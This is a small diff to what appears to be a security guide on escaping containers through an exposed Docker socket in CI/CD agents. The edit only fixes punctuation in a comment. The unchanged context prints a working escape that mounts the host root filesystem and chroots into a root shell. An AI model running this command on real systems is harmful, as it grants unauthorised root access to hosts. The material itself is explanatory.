@@ -240,7 +240,7 @@ This misconfiguration is extremely common in CI/CD environments: Jenkins agents,
 ls -la /var/run/docker.sock
 
 # Use the Docker CLI to launch a new privileged container that mounts the host root.
-# The Docker daemon: running as root: creates this container on behalf of the attacker.
+# The Docker daemon (running as root) creates this container on behalf of the attacker.
 # No kernel exploit required: we are instructing the privileged daemon to comply.
 docker run -v /:/hostfs --rm -it ubuntu:latest chroot /hostfs /bin/bash
 
